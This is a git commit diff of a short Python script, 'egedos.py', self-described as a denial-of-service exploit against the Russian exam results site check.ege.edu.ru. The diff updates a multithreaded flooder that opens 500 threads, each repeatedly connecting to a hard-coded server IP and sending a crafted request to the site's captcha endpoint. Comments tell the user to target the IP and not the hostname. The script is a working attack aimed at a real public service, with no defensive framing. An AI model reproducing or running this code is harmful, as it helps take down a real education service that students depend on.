f7b00d3894209f0f2514e03becd53c6d5d976351
DoctorEenot <47860375+DoctorEenot@users.noreply.github.com>
2019-10-21 11:25:52 +0300

    Add files via upload

--- egedos.py
+++ egedos.py
@@ -3,11 +3,21 @@ dos exploit for check.ege.edu.ru
 '''
 
 import socket
-import time
 import threading
-payload = b'GET /api/captcha HTTP/1.1\r\nHost: check.ege.edu.ru\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/67.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCookie: _ga=GA1.3.1464828177.1559906581; _gid=GA1.3.1262355183.1560170249\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=10000000\r\n\r\n'
+#If you want you can delete User-Agent and another headers
+
+payload = b'GET /api/captcha HTTP/1.1\r\n\
+Host: check.ege.edu.ru\r\n\
+User-Agent: Mozilla/5.0 (Windows NT 10.0;) Gecko/20100101 Firefox/67.0\r\n\
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\
+Connection: keep-alive\r\n\
+Cookie: _ga=GA1.3.1464828177.1559906581; _gid=GA1.3.1262355183.1560170249\r\n\
+Upgrade-Insecure-Requests: 1\r\n\
+Cache-Control: max-age=10000000000\r\n\r\n'
+
 print("Her vam a ne resultati")
-def dos():
+
+def dos():#Pretty simple dos
     global payload
     while True:
         try_ = True
@@ -15,7 +25,8 @@ def dos():
             sock = socket.socket()
             sock.settimeout(0.4)
             try:
-                sock.connect(('87.226.165.155',80))
+                sock.connect(('85.143.100.34',80))#May be different IP, must be checked
+                                                  #DON`T USE HOSTNAME ONLY IP!!!!!!!!!!
                 try_ = False
             except:
                 sock.close()
@@ -25,11 +36,12 @@ def dos():
                 sock.send(payload)
             except:
                 sock.close()
-                break  
+                break
+
+
 
 t = []
 n = 500
-
 for i in range(n):
         t.append(threading.Thread(target = dos))
 
